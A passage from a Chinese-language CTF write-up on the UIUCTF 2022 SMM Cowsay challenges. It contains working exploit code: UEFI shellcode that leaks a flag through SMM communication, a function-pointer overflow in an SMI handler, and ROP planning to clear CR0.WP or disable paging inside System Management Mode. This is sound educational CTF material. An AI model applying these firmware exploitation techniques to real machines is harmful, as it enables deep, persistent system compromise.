class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check output to see if things work</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>看起来一切都完美了,但实际上这个脚本并不能成功跑通</p><p><code>RAX  - 800000000000000F, RCX - 00000000000000B2, RDX - 00000000000000B2</code></p><p>返回值RAX是<code>800000000000000F</code>,通过UEFI的状态码表<a href="https://uefi.org/specs/UEFI/2.10/Apx_D_Status_Codes.html"> Status Codes — UEFI Specification 2.10 documentation</a>,我们可以得知这代表EFI_ACCESS_DENIED</p><p>尽管出题人明确添加了 EDK2 补丁以将 SMM 页表 ( <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> ) 中的所有内存标记为 RWX，但仍然对 SMM 通信执行健全性检查正如我们在 <a href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163">EDK2 源代码</a>中看到的那样，<strong>不允许communicate()函数的第二个参数缓冲区存在于不受信任或无效的内存区域（如我们的 shellcode 中使用的内存区域）</strong></p><p>不过当我们查看上面 <code>Binexec.efi</code> 的代码，在 <code>Cowsay()</code> 函数中， <code>EFI_SMM_COMMUNICATE_HEADER</code> 实际上是使用库函数 <code>AllocateRuntimeZeroPool()</code> 分配的。</p><p>这个函数同样存在于<code>BootServices</code>，但可以使用 <code>BootServices-&gt;AllocatePool()</code> 或 <code>BootServices-&gt;AllocatePages()</code> 指定我们要分配的内存“类型”来分配内存。我们想要的 <code>EFI_MEMORY_TYPE</code> 是类型 <code>EfiRuntimeServicesData</code> ，可以从 SMM 访问它。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后还有一个问题</p><p><code>IN CONST CHAR16 *Message</code></p><p>cowsay函数中调用的信息是UTF-16的,所以flag之会打印一半</p><p>不过将data中的0x44440000加上1即可,然后拼接一下</p><h2 id="uictf2022-cowsay2"><a href="#uictf2022-cowsay2" class="headerlink" title="uictf2022-cowsay2"></a>uictf2022-cowsay2</h2><p><strong>learn rop</strong></p><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>这个cowsay总共有三题都做一下</p><p>题目描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.</span><br></pre></td></tr></table></figure><p>题目环境与之前基本一样,但 <code>SmmCowsay.efi</code> 驱动程序的代码已更改。此外，我们不再拥有全局 RWX 内存，因为第五个 EDK2 补丁 ( <code>0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch</code> ) 现在不会解锁页表条目权限，而是显式地将包含该标志的内存区域设置为读保护！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmmSetMemoryAttributes (</span><br><span class="line">  <span class="number">0x44440000</span>,</span><br><span class="line">  EFI_PAGES_TO_SIZE(<span class="number">1</span>),</span><br><span class="line">  EFI_MEMORY_RP<span class="comment">//read protect</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>这意味着flag不可读了</p><p>提交消息中也给出了提示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line">Date: Mon, 28 Mar 2022 17:55:14 -0700</span><br><span class="line">Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses</span><br><span class="line"></span><br><span class="line">So attacker must disable paging or overwrite page table entries</span><br><span class="line">(which would require disabling write protection in cr0... so, the</span><br><span class="line">latter is redundant to former)</span><br></pre></td></tr></table></figure><p>EDK2 SMI 处理程序所做的第一件事是设置 4 级页表并启用 64 位长模式，因此 SMM 代码在带有页表的 64 位模式下运行。</p><p>页表中存储的虚拟地址与物理地址1:1对应，因此页表本身仅作为管理不同内存区域权限的一种方式（例如，不包含代码的页的页表项将具有NX 位设置）。标志页（ <code>0x44440000</code> ）被标记为“读保护”，这仅意味着相应的页表条目将清除当前位，因此任何访问都将导致页错误。</p><p>之前binexec的cowsay数据使用指针传输</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = MessageLen;</span><br><span class="line">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span><br></pre></td></tr></table></figure><p>但现在直接使用数据传输</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>让我们看看 <code>SmmCowsay.efi</code> 的更新代码。现在通讯情况如何？我们有一个新的 <code>mDebugData</code> 结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  CHAR16 Message[<span class="number">200</span>];</span><br><span class="line">  VOID <span class="title function_">EFIAPI</span> <span class="params">(* <span class="keyword">volatile</span> CowsayFunc)</span><span class="params">(IN CONST CHAR16 *Message, IN UINTN MessageLen)</span>;</span><br><span class="line">  BOOLEAN <span class="keyword">volatile</span> Icebp;</span><br><span class="line">  UINT64 <span class="keyword">volatile</span> Canary;</span><br><span class="line">&#125; mDebugData;</span><br></pre></td></tr></table></figure><p>该结构保存一个 <code>-&gt;CowsayFunc</code> 函数指针，该指针在驱动程序初始化时设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mDebugData.CowsayFunc = Cowsay;</span><br></pre></td></tr></table></figure><p>SMM处理程序代码在接收到消息时使用 <code>mDebugData</code> 结构，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  UINTN TempCommBufferSize;</span><br><span class="line">  UINT64 Canary;</span><br><span class="line"></span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize)</span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">  TempCommBufferSize = *CommBufferSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">  <span class="keyword">if</span> (EFI_ERROR(Status))</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  SetMem(mDebugData.Message, <span class="keyword">sizeof</span>(mDebugData.Message), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题就出在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br></pre></td></tr></table></figure><p>这里我们有一个类似 memcpy 的函数，使用 <code>-&gt;MessageLength</code> 从 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段（作为 <code>CommBuffer</code> 传递）执行复制字段作为大小（作为 <code>CommBufferSize</code> 传递）</p><p>那么这里是存在一个溢出的,如果数据大小超过<code>400</code>,那么就会覆盖到<code>CowsayFunc</code>字段</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>情况看起来很简单：发送 400 字节的垃圾，后跟一个地址，并在系统管理模式内获得 RIP 控制。一旦我们有了 RIP 控制，我们就可以构建一个 ROP 链来完成以下二者中的一个操作</p><ul><li>(A)完全禁用分页并读取标志</li><li>(B)关闭 <code>CR0.WP</code> （因为页表是只读的）并修补页面标志的表条目以使其可读。<a href="https://www.cnblogs.com/chingliu/archive/2011/08/28/2223804.html">关于cr0寄存器</a></li></ul><p>方法A是作者的解决方案。事实上，SMM GDT 中已经有一个很好的 32 位保护模式段描述符，我们可以将其用于代码段</p><p>但这里选择使用B方法</p><p>不过，构建 ROP 链存在一些问题：在 <code>call</code> 到我们的地址之后，我们失去了对执行的控制，因为我们无法控制 SMM 堆栈。简单地用我们的 shellcode 缓冲区的地址覆盖函数指针并在 SMM 中执行任意代码会很好，但正如我们之前所看到的，SMM 无法访问该内存区域，这只会导致崩溃。</p><p>qemu启动脚本增加</p><p><code>-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log</code></p><p>现在可以运行挑战并查看 <code>debug.log</code> 。在各种调试消息中，EDK2 打印它加载的每个驱动程序的基地址和入口点：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> handout/run; ./run.sh; <span class="built_in">cd</span> -</span><br><span class="line">$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure><p>毫无疑问，所有这些驱动程序的 <code>.text</code> 部分都将包含我们可以在 SMM 中执行的代码。让我们使用 EDK2 调试日志提供的基地址来使用 <code>ROPGadget</code> 来查找它们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> handout/edk2_artifacts</span><br><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 &gt;&gt; ../../gadgets.txt</span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 &gt;&gt; ../../gadgets.txt</span><br><span class="line"><span class="comment"># ... and so on ...</span></span><br></pre></td></tr></table></figure><p>尽管我们有gadget，但我们需要多个gadget来构建有用的 ROP 链。在第一个 <code>ret</code> 之后，如果我们不以某种方式将堆栈（RSP）移动到受控内存区域，控制权将返回到 <code>SmmCowsayHandler</code> ，因此我们需要的第一个gadget是能够将堆栈迁移到我们想要的位置的一个。</p><p>有这么一个非常好的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MdePkg/Library/BaseLib/X64/LongJump.nasm</span></span><br><span class="line">CetDone:</span><br><span class="line"></span><br><span class="line">    mov     rbx, [rcx]</span><br><span class="line">    mov     rsp, [rcx + <span class="number">8</span>]</span><br><span class="line">    mov     rbp, [rcx + <span class="number">0x10</span>]</span><br><span class="line">    mov     rdi, [rcx + <span class="number">0x18</span>]</span><br><span class="line">    mov     rsi, [rcx + <span class="number">0x20</span>]</span><br><span class="line">    mov     r12, [rcx + <span class="number">0x28</span>]</span><br><span class="line">    mov     r13, [rcx + <span class="number">0x30</span>]</span><br><span class="line">    mov     r14, [rcx + <span class="number">0x38</span>]</span><br><span class="line">    mov     r15, [rcx + <span class="number">0x40</span>]</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    jmp     qword [rcx + <span class="number">0x48</span>]</span><br></pre></td></tr></table></figure><p>我们的函数指针将使用 <code>CommBuffer</code> 作为第一个参数 (RCX) 进行调用，因此跳转到此处将直接从我们提供的数据加载一堆寄存器，包括 RSP。</p><p>这非常好，确实作者的解决方案使用它可以轻松迁移堆栈并继续 ROP 链，但是 <code>ROPgadget</code> 不够聪明，无法为我们找到这个gadget</p><p>所以原作者选用了一种更为复杂的方法</p><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>无论如何，我们仍然有一个不错的技巧。我们确实无法控制 SMM 堆栈，但是如果我们的某些寄存器溢出到堆栈上怎么办？使用 <code>ret 0x123</code> 或 <code>add rsp, 0x123; ret</code> 形式的gadget，我们将能够向前移动堆栈指针并使用我们在 SMM 堆栈上控制的任何内容作为另一个gadget。为了检查这一点，我们可以将调试器附加到 QEMU 并在 <code>SmmCowsayHandler()</code> 中调用 <code>mDebugData.CowsayFunc()</code> 时中断。</p><p>我们只需在命令行中添加 <code>-s</code> 即可在 QEMU 中启用调试，然后从 GDB 附加到它。</p><p>大佬编写了一个简单的 Python GDB 插件来从 <code>.debug</code> 文件加载调试符号</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;handout/edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure><p>漏洞利用的第一部分与 SMM Cowsay 1 相同：获取 <code>BootServices-&gt;AllocatePool</code> 和 <code>-&gt;LocateProtocol</code> ，找到 <code>SmmCommunication</code> 协议，分配一些内存进行写入我们的消息，并通过其 SMI 处理程序将其发送到 <code>SmmCowsay</code> 。唯一改变的是我们发送的内容：这次 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段将填充 400 字节的垃圾字符串，再加上 8 个字节以覆盖函数指针。</p><p>我们将使用易于识别的值填充所有未使用的通用寄存器，以便我们可以看到堆栈上溢出的内容：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;Attach GDB now and press [ENTER] to continue...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx, 0x0b0b0b0b</span></span><br><span class="line"><span class="string">    mov esi, 0x01010101</span></span><br><span class="line"><span class="string">    mov edi, 0x02020202</span></span><br><span class="line"><span class="string">    mov ebp, 0x03030303</span></span><br><span class="line"><span class="string">    mov r9 , 0x09090909</span></span><br><span class="line"><span class="string">    mov r10, 0x10101010</span></span><br><span class="line"><span class="string">    mov r11, 0x11111111</span></span><br><span class="line"><span class="string">    mov r12, 0x12121212</span></span><br><span class="line"><span class="string">    mov r13, 0x13131313</span></span><br><span class="line"><span class="string">    mov r14, 0x14141414</span></span><br><span class="line"><span class="string">    mov r15, 0x15151515</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span 